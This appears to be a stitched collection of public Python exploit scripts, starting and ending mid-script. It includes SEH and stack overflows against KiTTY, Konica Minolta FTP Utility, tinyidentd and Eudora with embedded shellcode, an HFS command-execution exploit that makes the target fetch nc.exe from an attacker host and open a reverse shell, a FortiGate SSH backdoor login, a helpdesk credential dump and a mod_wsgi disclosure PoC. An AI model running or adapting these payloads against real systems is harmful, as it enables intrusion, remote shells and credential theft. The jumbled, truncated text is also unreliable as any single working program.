        elif sys.argv[3] == "local_nc":
                netcat = "local"
        else:
                print "Unknown argument: %s" % sys.argv[3]
                sys.exit()

# Destination address, will be used to calculate dst addr copy from ECX + 0x0006EEC6
relative_jump = 0x112910E8      # = 0x0006EEC6 + 0x11222222     ; avoid NULLs
slice_size    = 118

# OS buffer alignement
# buffer length written to memory at time of crash
if   win == "win7":
        offset = 180
elif win == "win10":
        offset = 196
elif win == "winxp":
        offset = 160
        slice_size = 98         # buffer smaller on XP, slice size must be reduced
else:
        print "Unknown OS selected: %s" % win
        print "Please choose 'winxp', 'win7' or 'win10'"
        sys.exit()

# Shellcode choice: below is a Metasploit bind shell of 350 bytes. However I have tested successfully
# a Metasploit meterpreter reverse RC4 shell of 850 bytes (encoded with x86/alpha_mixed) on Windows XP where the buffer
# is the smallest. The shellcode was cut into 9 slices and worked perfectly :-) The same works of course
# for Windows 7 and Windows 10, where I tested successfully a Metasploit HTTPS reverse shell of 1178 bytes  
# (encoded with x86/alpha_mixed), which was cut into 10 slices. To generate such shellcode:
# msfvenom -p windows/meterpreter/reverse_https LHOST=YOUR_ATTACKER_IP LPORT=4444 -e x86/alpha_mixed -b '\x00\x0a\x0d\xff' -f c

# Metasploit Bind Shell 4444
# Encoder: x86/fnstenv_mov
# Bad chars: '\x00\x0a\x0d\xff'
# Size: 350 bytes
shellcode = (
"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0e\xf9"
"\xa7\x68\x83\xeb\xfc\xe2\xf4\xf2\x11\x25\x68\x0e\xf9\xc7\xe1"
"\xeb\xc8\x67\x0c\x85\xa9\x97\xe3\x5c\xf5\x2c\x3a\x1a\x72\xd5"
"\x40\x01\x4e\xed\x4e\x3f\x06\x0b\x54\x6f\x85\xa5\x44\x2e\x38"
"\x68\x65\x0f\x3e\x45\x9a\x5c\xae\x2c\x3a\x1e\x72\xed\x54\x85"
"\xb5\xb6\x10\xed\xb1\xa6\xb9\x5f\x72\xfe\x48\x0f\x2a\x2c\x21"
"\x16\x1a\x9d\x21\x85\xcd\x2c\x69\xd8\xc8\x58\xc4\xcf\x36\xaa"
"\x69\xc9\xc1\x47\x1d\xf8\xfa\xda\x90\x35\x84\x83\x1d\xea\xa1"
"\x2c\x30\x2a\xf8\x74\x0e\x85\xf5\xec\xe3\x56\xe5\xa6\xbb\x85"
"\xfd\x2c\x69\xde\x70\xe3\x4c\x2a\xa2\xfc\x09\x57\xa3\xf6\x97"
"\xee\xa6\xf8\x32\x85\xeb\x4c\xe5\x53\x91\x94\x5a\x0e\xf9\xcf"
"\x1f\x7d\xcb\xf8\x3c\x66\xb5\xd0\x4e\x09\x06\x72\xd0\x9e\xf8"
"\xa7\x68\x27\x3d\xf3\x38\x66\xd0\x27\x03\x0e\x06\x72\x02\x06"
"\xa0\xf7\x8a\xf3\xb9\xf7\x28\x5e\x91\x4d\x67\xd1\x19\x58\xbd"
"\x99\x91\xa5\x68\x1f\xa5\x2e\x8e\x64\xe9\xf1\x3f\x66\x3b\x7c"
"\x5f\x69\x06\x72\x3f\x66\x4e\x4e\x50\xf1\x06\x72\x3f\x66\x8d"
"\x4b\x53\xef\x06\x72\x3f\x99\x91\xd2\x06\x43\x98\x58\xbd\x66"
"\x9a\xca\x0c\x0e\x70\x44\x3f\x59\xae\x96\x9e\x64\xeb\xfe\x3e"
"\xec\x04\xc1\xaf\x4a\xdd\x9b\x69\x0f\x74\xe3\x4c\x1e\x3f\xa7"
"\x2c\x5a\xa9\xf1\x3e\x58\xbf\xf1\x26\x58\xaf\xf4\x3e\x66\x80"
"\x6b\x57\x88\x06\x72\xe1\xee\xb7\xf1\x2e\xf1\xc9\xcf\x60\x89"
"\xe4\xc7\x97\xdb\x42\x57\xdd\xac\xaf\xcf\xce\x9b\x44\x3a\x97"
"\xdb\xc5\xa1\x14\x04\x79\x5c\x88\x7b\xfc\x1c\x2f\x1d\x8b\xc8"
"\x02\x0e\xaa\x58\xbd"
)
# ###############################################################################
# ** Shellcode Slicer **
# ###############################################################################
# Slice our shellcode in as many parts as necessary
count      = 1
position   = 0
remaining  = len(shellcode)
slice      = []
total_size = 0

counter = 0
while position < len(shellcode):
        if remaining > (slice_size - 1):
                slice.append(shellcode[position:slice_size*count])
                position = slice_size * count
                remaining = len(shellcode) - position
                count += 1
        else: # last slice
                slice.append(shellcode[position:position+remaining] + '\x90' * (slice_size - remaining))
                position = len(shellcode)
                remaining = 0

                # If shellcode size is less than 256 bytes (\xFF), two slices only are required. However the jump
                # to shellcode being on 2 bytes, it would insert a NULL (e.g \xFE\x00). In this case we simply
                # add a NOP slice to keep this shellcode slicer generic.
                if len(shellcode) < 256:
                        slice.append('\x90' * slice_size)
                        total_size += slice_size

        # Keep track of whole slices size, which may be greater than original shellcode size
        # if padding is needed for the last slice. Will be used to calculate a jump size later
        total_size += len(slice[counter])

		
# ###############################################################################
# ** Buffer Builder **
# ###############################################################################
# Prepare as many buffers as we have shellcode slices
seh     = '\x36\x31\x4B\x00'               				# 0x004B3136 / POP POP RET / kitty_portable.exe 0.65.0.2p
#seh    = '\x43\x82\x4B\x00'                            # 0x004B8243 / POP POP RET / kitty_portable.exe 0.63.2.2p
#seh    = '\x0B\x34\x49\x00'                            # 0x0049340B / POP POP RET / kitty_portable.exe 0.62.1.2p
nseh    = '\x90' * 4            						# will be calculated later
junk    = '\x41' * 58
endmark = '\x43' * 5					   				# used to mark end of slice
buffer  = []

for index in range(len(slice)):
        # Slice end marker, to stop copy once reached   # mov edi,0x4343XXXX
        shellcode_end = '\xBF' + slice[index][slice_size-2:slice_size] + '\x43\x43'

        shell_copy = ( # 51 bytes
        # Calculate shellcode src & dst address
        '\x8B\x5C\x24\x08'                              # mov ebx,[esp+8]       ; retrieve nseh address
        )

        if index < (len(slice) - 1):
														# sub bl,0xB2           ; calculate shellcode position from nseh
                shell_copy += '\x80\xEB' + struct.pack("<B", slice_size + len(endmark) + 51 + len(nseh))            
        else: # last slice      
														# sub bl,0xB1           ; calculate shellcode position from nseh
                shell_copy += '\x80\xEB' + struct.pack("<B", slice_size + len(endmark) + 50 + len(nseh))            

		# In this exploit we retrieve an address from the main process memory, using ECX. This will be used below to calculate
        # shellcode destination. On other exploits, it may be necessary to use another register (or even to hardcode the address)
        shell_copy += (
        '\x89\xCE'                                      # mov esi,ecx           ; retrieve main process memory address
        '\x31\xC9'                                      # xor ecx,ecx           ; will store the increment
        )

        # Calculate shellcode destination relative to memory address retrieved above. As we ADD an address having NULLs
        # we store a non NULL address instead, that we SUB afterwards in the register itself
        if index > 0:                                   # add esi,0x1117FED7 (+118 * x)
                shell_copy += '\x81\xC6' + struct.pack("<I", relative_jump + (slice_size * index))
        else: # first slice
                shell_copy += '\x81\xC6' + struct.pack("<I", relative_jump)

        shell_copy += (
        '\x81\xEE\x22\x22\x22\x11'                      # sub esi,0x11222222    ; calculate shellcode destination
        )

        shell_copy += shellcode_end                     # mov edi,0x4343XXXX    ; shellcode end mark
		
		shell_copy += (
        # Shellcode copy loop
        '\x83\xC1\x04'                                  # add ecx, 0x4          ; increment counter
        '\x83\xC6\x04'                                  # add esi, 0x4          ; increment destination
        '\x8B\x14\x0B'                                  # mov edx,[ebx+ecx]     ; put shell chunk into edx
        '\x89\x16'                                      # mov [esi],edx         ; copy shell chunk to destination
        '\x39\xFA'                                      # cmp edx,edi           ; check if we reached shellcode end mark (if yes set ZF = 1)
        '\x75\xF1'                                      # jne short -13         ; if ZF = 0, jump back to increment ecx
        )

        if index < (len(slice) - 1):
                shell_copy += ( # infinite loop
                '\x90\x90\x90\x90'                      # nop nop nop nop       ; infinite loop
                '\xEB\xFA\x90\x90'                      # jmp short -0x4        ; infinite loop
                )
        else: # last slice
                                                        # sub si,0x160          ; prepare jump address: sub len(slices)
                shell_copy += '\x66\x81\xEE' + struct.pack("<H", total_size - 2)

                shell_copy += (
                '\x56'                                  # push esi              ; store full shellcode address on stack
                '\xC3'                                  # ret                   ; jump to shellcode (we cannot us JMP or CALL as \xFF is a bad char)
                )
														# jmp short -len(shell_copy)
		nseh    = '\xEB' + struct.pack("<B", 254 - len(shell_copy)) + '\x90\x90'
        padding = '\x42' * (offset - len(slice[index]) - len(endmark) - len(shell_copy))
		
        buffer.append(junk + padding + slice[index] + endmark + shell_copy + nseh + seh)

		
# ###############################################################################
# ** Slice Launcher **
# ###############################################################################
# Send all of our buffers to the target!
sock = []
print "[*] Connecting to %s" % host
for index in range(len(buffer)):
        sock.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        try:
                sock[index].connect((host, 1987))
                time.sleep(1)
                print "[*] Sending evil buffer%d... (slice %d/%d)" % (index+1, index+1, len(buffer))
                sock[index].send(buffer[index])
                time.sleep(1)
                sock[index].close()
                time.sleep(2)

                if index == (len(buffer) - 1):
                        if   netcat == "disabled":
                                print "[*] Done."
                        elif netcat == "local":
                                print "\n[*] Waiting for our shell!"
                                os.system("nc -nlvp 4444")
                        elif netcat == "remote": # default
                                print "\n[*] Connecting to our shell..."
                                time.sleep(2)
                                os.system("nc -nv " + host + " 4444")
        except:
                print "[-] Error sending buffer"
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
	
source: http://www.securityfocus.com/bid/67271/info

AssistMyTeam Team Helpdesk is prone to multiple information-disclosure vulnerabilities.

Successfully exploiting these issues may allow an attacker to obtain sensitive information that may aid in further attacks.

Team Helpdesk 8.3.5 is vulnerable; other versions may also be affected. 

#!/usr/bin/python

import sys
import re
import os
import subprocess

print "This is an User Credential Dump for Team Helpdesk Customer Wev Service 8.3.5 (and prior) by bhamb.\n"
print "Send any comment to ccb3b72@gmail.com\n"

if len(sys.argv) != 2:
	print('Usage: user_cred_dump.py https://Hostname.com')
	exit(1)

hostname=sys.argv[1]+"/cws/bin/cwacallers.xml"
print hostname
subprocess.Popen(['wget', '--no-check-certificate',hostname]).communicate()

print "The following usernames and encrypted password were found.\n"
cmd="cat cwacallers.xml | grep '@' | cut -d'\"' -f4,6 | sed 's/\"/:/g' "
test=os.system(cmd)





source: http://www.securityfocus.com/bid/67534/info

mod_wsgi is prone to a remote information-disclosure vulnerability.

Attackers can exploit this issue to obtain sensitive information that may aid in launching further attacks. 

import functools
 
import threading
import time
import random
 
def run(*args):
    while True:
        items = []
        for i in range(1000):
            items.append((int(random.random()*20)*'X'))
        time.sleep(0.00001)
 
thread = threading.Thread(target=run)
thread.start()
 
def headers():
    return [('Content-Type', 'text/plain'.upper().lower())]
 
def response():
    yield 'Hello World!\n'
 
_content_type_cache = {}
 
def intern_content_type(application):
    @functools.wraps(application)
    def _wrapper(environ, start_response):
        def _start_response(status, headers, *args):
            _headers = []
            for header, value in headers:
                if header.lower() == 'content-type':
                    value = _content_type_cache.setdefault(value, value)
                _headers.append((header, value))
            return start_response(status, _headers, *args)
        return application(environ, _start_response)
    return _wrapper
 
#@intern_content_type
def application(environ, start_response):
    status = '200 OK'
 
    start_response(status, headers())
    return response()
# Title: Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow.
# Date : 01/08/2016
# Author: TOMIWA.
# Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
# Software: Konica Minolta FTP Utility v1.0
# Tested: Windows 7 SP1 64bits
# Listen for a reverse netcat connection on port 4444
# root@kali:~# nc -nlvp 4444
# listening on [any] 4444 ...
# connect to [192.168.0.11] from (UNKNOWN) [192.168.0.109] 49158
# Microsoft Windows [Version 6.1.7601]
# Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

# C:\Program Files (x86)\KONICA MINOLTA\FTP Utility>


#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2B"
#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.118 LPORT=4444 -e x86/shikata_ga_nai -b "\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
buf =  ""
buf += "\xbe\x95\x8c\xbb\x24\xdb\xdb\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x5f\x31\x72\x14\x83\xc2\x04\x03\x72\x10\x77"
buf += "\x79\x62\xe1\xae\xf6\xb1\x1e\xed\x1e\xe6\x8d\x3f\xba"
buf += "\x32\xfb\x8e\x64\x74\x90\xea\x97\x1d\x7c\x89\x73\x1d"
buf += "\x62\x91\x66\xa8\x21\x9a\xb7\xf6\xc8\xce\xd3\x8e\x8f"
buf += "\x12\xa5\xc1\x62\x44\xeb\x33\x84\x55\x7e\xa1\xae\xc1"
buf += "\x73\x50\xb4\xc6\xeb\x8a\x28\x66\x13\x8b\x8b\x42\x6d"
buf += "\x5b\xa6\x63\x02\xbe\x7b\x71\xf0\xcd\x6e\x36\x8c\x69"
buf += "\x3a\x7b\xc8\x03\xc7\xcf\xbe\x12\x0e\xf3\x7a\x29\xa7"
buf += "\xe3\xb3\x54\xd3\x12\xd7\x99\x2c\x7e\x63\x6d\x08\x79"
buf += "\x20\x29\x59\xf2\xfe\xe0\x1f\x9e\x6b\xa6\x36\x5a\x75"
buf += "\x15\xd8\x5d\x8b\x65\xdb\xad\x7c\x84\xe8\x17\xac\x07"
buf += "\xef\x45\x18\x29\x06\xbe\x07\x65\x68\xd5\xf9\xcb\x15"
buf += "\x56\x13\x25\xa3\x72\xd0\xd7\x57\x77\xbb\x8f\x4d\x17"
buf += "\xaf\xf9\x77\x53\x17\xf5\xeb\xab\xe0\x11\x1f\x88\xea"
buf += "\xab\xa9\xce\x0b\x8d\x84\x8f\x76\x05\x05\xdc\x04\x0c"
buf += "\x16\xc9\x84\x06\x6f\x2d\x02\x61\x59\xcd\x36\x17\x88"
buf += "\xe9\x3a\x4f\x63\x9e\x61\x24\xbf\xdc\xd9\x53\x42\x1a"
buf += "\xdf\xb2\x6e\xfe\xec\x8c\xf5\x6d\xeb\x74\x89\x29\x11"
buf += "\x1f\x4d\x9c\xc4\x64\xb9\x8c\x54\xa3\x2c\x3f\xf4\x98"
buf += "\x42\x11\xe0\x06\x32\x57\x75\xac\xaa\xec\x10\xda\x6d"
buf += "\x20\x51\x57\xdd\x99\x1f\x35\x90\x23\xb6\xdb\x37\x17"
buf += "\x1f\x1b\xea\xd1\x37\xc0\x88\x74\x4e\x74\xcf\x63\xb0"
buf += "\x4f\xdc\x2c\x90\xe2\x08\xcd\x49\x40\x36\x1a\xfb\x18"
buf += "\x29\x2b\x6f\x2e\x3c\x57\x6a\x79\xa8\xac\x49\xbe\xe7"
buf += "\x2e\x48\xa0\xeb\x4f\x36\x3b\xa2\x40\xff\x9f\x21\xcd"
buf += "\x8e\xb3\xdf\x92\xed\x3f\x12\x81\x1a\xba\x02\x20\x8f"
buf += "\x1d\x5a\xef\xb1\xc3\xb0\x90\xed\x6a\x21\x5b\xc6\xb9"
buf += "\x24\x3f\xa0\x3f\xc8\x4f\x05\xa3\xcf\x06\xa4\x06\xd5"
buf += "\x8e\xd7\x3e\x11\xc4\x8c\x12\xa7\x3b\x75\x3f\xe8\xd3"
buf += "\xd7\x08\x39\x83\xfa\x80\x71\x3c\x6e\x29\x8d\x5e\xcc"
buf += "\xa1\xd4"
#nSEH = "\xEB\x13\x90\x90"
#SEH = "\x9D\x6D\x20\x12" >> 12206D9D
buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" *30 +  buf +  "D"*1955 
#buffer = "\x41" * 1060
print "\sending evil buffer...."
s.connect(('192.168.0.109',21)) #HARDCODED IP ADDRESS.
data = s.recv(1024)
s.send('USER anonymous' + '\r\n')
data = s.recv(1024)
s.send('PASS anonymous' + '\r\n')
data = s.recv(1024)
s.send('CWD ' +buffer+'\r\n')
s.close
#!/usr/bin/env python

# SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7
# Usage: ./fgt_ssh_backdoor.py <target-ip>

import socket
import select
import sys
import paramiko
from paramiko.py3compat import u
import base64
import hashlib
import termios
import tty

def custom_handler(title, instructions, prompt_list):
    n = prompt_list[0][0]
    m = hashlib.sha1()
    m.update('\x00' * 12)
    m.update(n + 'FGTAbc11*xy+Qqz27')
    m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
    h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
    return [h]


def main():
    if len(sys.argv) < 2:
        print 'Usage: ' + sys.argv[0] + ' <target-ip>'
        exit(-1)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(sys.argv[1], username='', allow_agent=False, look_for_keys=False)
    except paramiko.ssh_exception.SSHException:
        pass

    trans = client.get_transport()
    try:
        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
    except paramiko.ssh_exception.AuthenticationException:
        pass

    trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)
    chan = client.invoke_shell()

    oldtty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        chan.settimeout(0.0)

        while True:
            r, w, e = select.select([chan, sys.stdin], [], [])
            if chan in r:
                try:
                    x = u(chan.recv(1024))
                    if len(x) == 0:
                        sys.stdout.write('\r\n*** EOF\r\n')
                        break
                    sys.stdout.write(x)
                    sys.stdout.flush()
                except socket.timeout:
                    pass
            if sys.stdin in r:
                x = sys.stdin.read(1)
                if len(x) == 0:
                    break
                chan.send(x)

    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)


if __name__ == '__main__':
    main()#
#tinyidentd exploit code by
#thomas . pollet _at_ gmail . com
#bug by Maarten Boone
#
#usage: python exploit.py [target]
#
import socket,sys
#jmp into nop sled
payload  = '\xeb\x20'  
#ident crap
payload += ', 28 : USERID : UNIX : '
#nop sled
payload +='XXXX'
# jmp *%esi
payload += '\x77\x13\x83\x7c'  #XP kernel32.dll
#payload += '\xb1\x63\xd9\x77' #W2K rpcrt4.dll
#metasploit alphanumeric shellcode calc.exe
shellcode = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x48\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x44"
shellcode += "\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x54\x42\x32\x41\x42\x32\x42"
shellcode += "\x41\x30\x42\x41\x58\x41\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x4b"
shellcode += "\x58\x51\x54\x65\x50\x57\x70\x45\x50\x4e\x6b\x67\x35\x35\x6c\x4e"
shellcode += "\x6b\x73\x4c\x55\x55\x71\x68\x67\x71\x68\x6f\x6c\x4b\x52\x6f\x46"
shellcode += "\x78\x4e\x6b\x51\x4f\x71\x30\x74\x41\x7a\x4b\x30\x49\x6c\x4b\x54"
shellcode += "\x74\x6e\x6b\x76\x61\x4a\x4e\x35\x61\x4b\x70\x6a\x39\x4c\x6c\x4d"
shellcode += "\x54\x6b\x70\x30\x74\x54\x47\x6a\x61\x6a\x6a\x64\x4d\x63\x31\x79"
shellcode += "\x52\x4a\x4b\x69\x64\x67\x4b\x32\x74\x65\x74\x66\x64\x31\x65\x4a"
shellcode += "\x45\x6c\x4b\x71\x4f\x31\x34\x57\x71\x48\x6b\x52\x46\x6e\x6b\x64"
shellcode += "\x4c\x52\x6b\x4e\x6b\x31\x4f\x77\x6c\x54\x41\x68\x6b\x4c\x4b\x57"
shellcode += "\x6c\x6c\x4b\x57\x71\x4a\x4b\x4e\x69\x41\x4c\x65\x74\x67\x74\x4a"
shellcode += "\x63\x75\x61\x4f\x30\x51\x74\x6c\x4b\x61\x50\x50\x30\x4f\x75\x4f"
shellcode += "\x30\x32\x58\x64\x4c\x4c\x4b\x71\x50\x54\x4c\x4c\x4b\x70\x70\x57"
shellcode += "\x6c\x4e\x4d\x6e\x6b\x73\x58\x35\x58\x4a\x4b\x36\x69\x6c\x4b\x4d"
shellcode += "\x50\x4c\x70\x67\x70\x75\x50\x37\x70\x4c\x4b\x45\x38\x35\x6c\x41"
shellcode += "\x4f\x57\x41\x68\x76\x53\x50\x30\x56\x6e\x69\x6b\x48\x6f\x73\x6f"
shellcode += "\x30\x63\x4b\x62\x70\x30\x68\x58\x70\x6f\x7a\x57\x74\x51\x4f\x45"
shellcode += "\x38\x6f\x68\x59\x6e\x4f\x7a\x66\x6e\x62\x77\x69\x6f\x38\x67\x73"
shellcode += "\x53\x52\x41\x30\x6c\x71\x73\x64\x6e\x35\x35\x30\x78\x70\x65\x45"
shellcode += "\x50\x44"

nopsize=523-len(payload)-len(shellcode)
nopsled=''
for i in range(nopsize):
    nopsled+='\x90'

payload=payload.replace('XXXX',nopsled+shellcode)

try:
    target=sys.argv[1]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,113))
    s.send(payload+'\n')
    s.close()
    print 'done'
except:
    print 'usage : %s [target]'%sys.argv[0]

# milw0rm.com [2007-05-14]
#!/usr/bin/python
# Eudora 7.1 SMTP Response 0day Remote Buffer Overflow PoC Exploit
# Bug discovered by Krystian Kloskowski (h07) <h07@interia.pl>
# Tested on Eudora 7.1.0.9 / XP SP2 Polish
# Shellcode type: Windows Execute Command (calc.exe)
# Note:..
# This vulnerability can be exploited only if user
# will ignore warning about "buffer overflow" error.
##

from struct import pack
from time import sleep
from socket import *

bind_addr = '0.0.0.0'
bind_port = 25

shellcode = (
"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

opcode = 0x7CA58265 # JMP ESP (SHELL32.DLL / XP SP2 Polish)

buf = "250-"
buf += "A" * 76
buf += pack("<L", opcode)
buf += "\x90" * 32
buf += shellcode
buf += "\r\n"

s = socket(AF_INET, SOCK_STREAM)
s.bind((bind_addr, bind_port))
s.listen(1)
print "Listening on %s:%d..." % (bind_addr, bind_port)
cl, addr = s.accept()
print "Connected accepted from: %s" % (addr[0])
cl.send('220 Dupa Jasia\r\n')
print cl.recv(1024)[:-1]
cl.send(buf)
sleep(1)
cl.close()
s.close()
print "Done"

# EoF

# milw0rm.com [2007-05-15]
####################################################################################
#           Hidden Administrator Authenticaiton Bypass Exploit                     #
#                   ahmed[at]rewterz.com                                           #
#            http://www.securityfocus.com/bid/24049                                #
#                                                                                  #
# C:\>python rewt-ha-exp.py                                                        #
# Usage: rewt-ha-exp.py -h <host ip> -p <port> -t <tftpd server ip>                #
# make sure nc.exe exists on tftpd server                                          #
#                                                                                  #
# C:\>telnet 192.168.1.4 4444                                                      #
# C:\>python rewt-ha-exp.py -h 192.168.1.4 -p 3128 -t 192.168.1.105                #
# [+] Connecting to 192.168.1.4                                                    #
# [+] Uploading Files                                                              #
# [+] DONE [+]                                                                     #
# [+] Now Connect to port 4444 on victim IP !!!                                    #
#                                                                                  #
# C:\>telnet 192.168.1.4 4444                                                      #
# Microsoft Windows XP [Version 5.1.2600]                                          #
# (C) Copyright 1985-2001 Microsoft Corp.                                          #
# C:\ha_server>                                                                    # 
####################################################################################


import socket
import struct
import time
import sys
import getopt


def usage():
	print "\n"
	print "######################################################"
	print "# Hidden Administrator Authentication Bypass Exploit #"
	print "#           Coded By ahmed[at]rewterz.com            #"
	print "######################################################"
	print "\n"
	print "Usage: %s -h <host ip> -p <port> -t <tftpd server ip>" % sys.argv[0]
	print "make sure nc.exe exists on tftpd server\n"

def exploit():
	h ="%X" % (130+len(tftpd))
